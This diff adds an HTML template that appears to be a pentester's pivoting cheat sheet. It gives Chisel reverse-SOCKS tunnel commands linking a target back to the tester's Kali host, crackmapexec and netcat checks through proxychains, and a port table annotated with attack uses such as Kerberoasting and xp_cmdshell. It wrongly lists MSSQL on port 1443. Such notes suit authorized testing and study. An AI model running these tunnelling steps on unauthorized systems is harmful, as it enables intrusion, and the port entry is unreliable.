@@ -1,0 +1,244 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Prerequisite</h1>
+    <div class="code-box"><pre><code>arp -a</code></pre></div>
+    <h2 class="blue">Expected output</h2>
+    <div class="code-box"><pre><code>Interface: 172.16.190.254 --- 0x5
+  Internet Address      Physical Address      Type
+  <u class="blue">172.16.190.10</u>         00-50-56-ab-b3-07     dynamic
+  172.16.190.11         00-50-56-ab-20-0e     dynamic
+  172.16.190.12         00-50-56-ab-1c-37     dynamic
+  172.16.190.13         00-50-56-ab-1a-bc     dynamic
+  172.16.190.14         00-50-56-ab-ec-fd     dynamic   
+  172.16.190.82         00-50-56-ab-61-e8     dynamic
+  172.16.190.83         00-50-56-ab-4d-7e     dynamic
+  172.16.190.255        ff-ff-ff-ff-ff-ff     static
+  224.0.0.22            01-00-5e-00-00-16     static
+  224.0.0.251           01-00-5e-00-00-fb     static
+  224.0.0.252           01-00-5e-00-00-fc     static
+  239.255.255.250       01-00-5e-7f-ff-fa     static</code></pre></div>
+
+
+  <h1>Chisel</h1>
+    <h2 class="blue">On OUR Kali machine</h2>
+    <div class="code-box"><pre><code>./chisel server -p 8001 --reverse</code></pre></div>
+    <h2 class="blue">On the target machine</h2>
+    <div class="code-box"><pre><code>.\chisel.exe client $MY_IP:8001 R:socks</code></pre></div>
+
+
+    <h1>Access check</h1>
+    <h2 class="blue">SMB and WinRM</h2>
+    <div class="code-box"><pre><code>proxychains4 crackmapexec smb/winrm $TART_IP</code></pre></div>
+    <h2 class="blue">Others</h2>
+    <div class="code-box"><pre><code>proxychains4 nc -nv 172.16.127.10 $PORT</code></pre></div>
+
+    <h1>Target Ports</h1>
+<table>
+    <thead>
+        <tr>
+            <th>Ports</th>
+            <th>Application</th>
+            <th>DC Port</th>
+            <th>Web,Files Ports</th>
+            <th>Linux/Web/DC</th>
+            <th>Role</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>22</td>
+            <td>SSH</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>Primary remote shell access to Linux or appliances; good pivot entry.</td>
+        </tr>
+        <tr>
+            <td>53</td>
+            <td>DNS</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Domain name resolution; often indicates DCs or infrastructure servers.</td>
+        </tr>
+        <tr>
+            <td>80</td>
+            <td>HTTP</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>Unencrypted web apps, admin panels, and potential initial footholds.</td>
+        </tr>
+        <tr>
+            <td>443</td>
+            <td>HTTPs</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>Encrypted web apps, portals, and APIs; often exposed to users.</td>
+        </tr>
+        <tr>
+            <td>8080</td>
+            <td>HTTP(alternative)</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>Alternate HTTP for admin consoles, dev apps, or proxies (e.g. Tomcat).</td>
+        </tr>
+        <tr>
+            <td>88</td>
+            <td>Kerberos</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Domain logon ticket service; key for Kerberoasting and auth attacks.</td>
+        </tr>
+        <tr>
+            <td>135</td>
+            <td>MS-RPC</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>RPC endpoint used by many AD/DC services and remote management.</td>
+        </tr>
+        <tr>
+            <td>139</td>
+            <td>Net-Bios</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>Legacy Windows file and name service; still useful for enumeration.</td>
+        </tr>
+        <tr>
+            <td>445</td>
+            <td>SMB</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>File shares, admin$ / C$ access, and classic lateral movement channel.</td>
+        </tr>
+        <tr>
+            <td>389</td>
+            <td>LDAP</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Directory queries for users, groups, and computers; core AD enum.</td>
+        </tr>
+        <tr>
+            <td>636</td>
+            <td>LDAPS</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>LDAP over TLS; same data as LDAP but encrypted, used by some apps.</td>
+        </tr>
+        <tr>
+            <td>3268</td>
+            <td>GLOBAL Catalog LDAP</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Forest-wide LDAP queries across all domains via Global Catalog.</td>
+        </tr>
+        <tr>
+            <td>3269</td>
+            <td>GCLs</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Global Catalog over TLS; forest-wide directory queries securely.</td>
+        </tr>
+        <tr>
+            <td>464</td>
+            <td>kpasswd</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>Kerberos password change/reset service; occasionally abused in attacks.</td>
+        </tr>
+        <tr>
+            <td>5985</td>
+            <td>WinRM HTTP</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>Remote PowerShell / command execution over HTTP (e.g. evil-winrm).</td>
+        </tr>
+        <tr>
+            <td>5986</td>
+            <td>Winrm HTTPs</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>Remote PowerShell / command execution over HTTPS for hardened hosts.</td>
+        </tr>
+        <tr>
+            <td>3389</td>
+            <td>RDP(GUI)</td>
+            <td>🔴</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>Full GUI remote desktop; useful for manual inspection and tooling.</td>
+        </tr>
+        <tr>
+            <td>9389</td>
+            <td>AD Web Services</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>AD Web Services (ADWS); used by some management tools and scripts.</td>
+        </tr>
+        <tr>
+            <td>1443</td>
+            <td>MSSQL</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>✖</td>
+            <td>Microsoft SQL Server; target for DB creds, xp_cmdshell, linked servers.</td>
+        </tr>
+        <tr>
+            <td>3306</td>
+            <td>MySQL/MariaDB</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>MySQL/MariaDB database; common backend for web apps and CMSes.</td>
+        </tr>
+        <tr>
+            <td>5432</td>
+            <td>PostgreSQL</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>PostgreSQL database; may allow OS-level commands with high privileges.</td>
+        </tr>
+        <tr>
+            <td>6379</td>
+            <td>Redis</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>In-memory key-value store; misconfigs can lead to RCE or data theft.</td>
+        </tr>
+        <tr>
+            <td>9200</td>
+            <td>Elasticsearch</td>
+            <td>✖</td>
+            <td>✖</td>
+            <td>🔴</td>
+            <td>Search / logging backend; HTTP API sometimes exposes sensitive data.</td>
+        </tr>
+    </tbody>
+</table>
+
+</body>
+</html>
